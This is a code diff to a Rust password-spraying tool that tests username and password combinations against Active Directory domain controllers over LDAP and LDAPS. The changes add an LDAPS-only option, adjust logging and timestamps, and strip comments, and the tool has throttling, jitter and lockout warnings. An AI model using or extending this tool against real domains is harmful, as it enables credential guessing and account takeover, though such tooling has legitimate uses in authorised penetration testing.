@@ -69,6 +69,8 @@ struct RateLimiter {
 
 impl SprayConfig {
     pub fn from_args(args: &SprayArgs) -> Result<Self, Box<dyn Error>> {
+        debug::set_debug_level(args.verbose);
+        
         let threads = if args.threads > MAX_CONCURRENT_THREADS {
             println!(
                 "[!] Warning: Thread count capped at {}",
@@ -154,7 +156,7 @@ impl RateLimiter {
 pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
     display_spray_banner(&config);
 
-    let reachable_dcs = test_domain_controllers(&config.dc_ip)?;
+    let reachable_dcs = test_domain_controllers(&config.dc_ip, config.use_ldaps)?;
     if reachable_dcs.is_empty() {
         return Err("No reachable Domain Controllers found".into());
     }
@@ -192,22 +194,34 @@ fn display_spray_banner(config: &SprayConfig) {
     println!("{}[*] Domain: {}", timestamp_prefix, config.domain);
 }
 
-fn test_domain_controllers(dc_list: &[String]) -> Result<Vec<String>, Box<dyn Error>> {
+fn test_domain_controllers(dc_list: &[String], use_ldaps: bool) -> Result<Vec<String>, Box<dyn Error>> {
     println!("[*] Testing connectivity to Domain Controllers...");
     let mut reachable_dcs = Vec::new();
 
-    for dc in dc_list {
-        // Test both LDAP and LDAPS ports
-        let ldap_reachable = test_port(dc, 389);
-        let ldaps_reachable = test_port(dc, 636);
+    let ports_to_test = if use_ldaps {
+        vec![("LDAPS", 636)]
+    } else {
+        vec![("LDAPS", 636), ("LDAP", 389)]
+    };
 
-        if ldap_reachable || ldaps_reachable {
-            println!(
-                "[+] Successfully connected to {} (LDAP: {}, LDAPS: {})",
-                dc,
-                if ldap_reachable { "✓" } else { "✗" },
-                if ldaps_reachable { "✓" } else { "✗" }
-            );
+    for dc in dc_list {
+        let mut connection_results = Vec::new();
+        let mut any_reachable = false;
+
+        for (protocol, port) in &ports_to_test {
+            let reachable = test_port(dc, *port);
+            connection_results.push((*protocol, reachable));
+            if reachable {
+                any_reachable = true;
+            }
+        }
+
+        if any_reachable {
+            let status: Vec<String> = connection_results
+                .iter()
+                .map(|(proto, ok)| format!("{}: {}", proto, if *ok { "✓" } else { "✗" }))
+                .collect();
+            println!("[+] Successfully connected to {} ({})", dc, status.join(", "));
             reachable_dcs.push(dc.clone());
         } else {
             println!("[-] Failed to connect to {}", dc);
@@ -294,13 +308,12 @@ fn execute_spray(
     let total_combinations = users.len() * passwords.len();
     let mut completed_attempts = 0;
 
-    let timestamp_prefix = if config.timestamp_format {
-        format!("[{}] ", get_timestamp())
-    } else {
-        String::new()
-    };
-
     for (password_index, password) in passwords.iter().enumerate() {
+        let timestamp_prefix = if config.timestamp_format {
+            format!("[{}] ", get_timestamp())
+        } else {
+            String::new()
+        };
         println!(
             "\n{}[*] Testing password: '{}' ({}/{} passwords)",
             timestamp_prefix,
@@ -311,7 +324,6 @@ fn execute_spray(
 
         debug::debug_log(1, format!("Using {}s delay + {}ms jitter between attempts...", config.delay, config.jitter));
 
-        // Create work items for this password only
         let mut work_items = Vec::new();
         for (user_index, username) in users.iter().enumerate() {
             let dc_index = user_index % dcs.len();
@@ -324,7 +336,6 @@ fn execute_spray(
             });
         }
 
-        // Process this password's attempts with real-time results
         let early_stop = process_password_batch_realtime(
             config,
             work_items,
@@ -336,7 +347,6 @@ fn execute_spray(
 
         debug::debug_log(1, format!("Completed password '{}' ({}/{} total attempts)", password, completed_attempts, total_combinations));
 
-        // Check for early termination
         if early_stop {
             println!(
                 "{}[*] Stopping spray due to successful login or user request.",
@@ -345,12 +355,10 @@ fn execute_spray(
             break;
         }
 
-        // Check if we should stop due to lockout concerns
         if should_stop_spray(config, state.clone())? {
             break;
         }
 
-        // Small delay between passwords
         if password_index < passwords.len() - 1 {
             thread::sleep(Duration::from_millis(500));
         }
@@ -377,13 +385,11 @@ fn process_password_batch_realtime(
     let (work_tx, work_rx) = mpsc::channel();
     let (result_tx, result_rx) = mpsc::channel();
 
-    // Send all work items
     for item in work_items {
         work_tx.send(item)?;
     }
     drop(work_tx);
 
-    // Create worker threads - limit to the configured number
     let work_rx = Arc::new(Mutex::new(work_rx));
     let mut handles = Vec::new();
     let actual_threads = std::cmp::min(config.threads as usize, 50);
@@ -436,22 +442,18 @@ fn process_password_batch_realtime(
         handles.push(handle);
     }
 
-    // Drop the main result sender so the channel closes when all workers finish
     drop(result_tx);
 
-    // Process results in real-time as they come in
     let mut early_stop = false;
     let mut results_processed = 0;
 
     while let Ok(result) = result_rx.recv() {
-        // Process and display result immediately
         if let Err(e) = process_attempt_result_realtime(config, &result, state.clone()) {
             eprintln!("[!] Error processing result: {}", e);
             early_stop = true;
             break;
         }
 
-        // Check for early termination after each successful login
         if matches!(result.result, LoginResult::Success) && !config.continue_on_success {
             early_stop = true;
             break;
@@ -460,7 +462,6 @@ fn process_password_batch_realtime(
         results_processed += 1;
     }
 
-    // Wait for all threads to complete
     for handle in handles {
         handle.join().unwrap_or(());
     }
@@ -476,7 +477,6 @@ fn attempt_login(
     password: &str,
     dc: &str,
 ) -> (LoginResult, Option<String>) {
-    // Try LDAPS first, then LDAP
     let protocols = if config.use_ldaps {
         vec![("ldaps", 636)]
     } else {
@@ -499,7 +499,6 @@ fn attempt_login(
                         Some(e.to_string()),
                     );
                 }
-                // Continue to LDAP if LDAPS fails
             }
         }
     }
@@ -642,7 +641,6 @@ fn process_attempt_result_realtime(
                 println!("{}[!] \x1b[33mWARNING: {} has {} failed attempts within {} seconds - approaching lockout threshold!\x1b[0m",
                         timestamp_prefix, attempt.username, current_attempts, config.lockout_window_seconds);
 
-                // Ask user if they want to continue
                 print!(
                     "{}[!] Continue spraying this user? (y/n): ",
                     timestamp_prefix
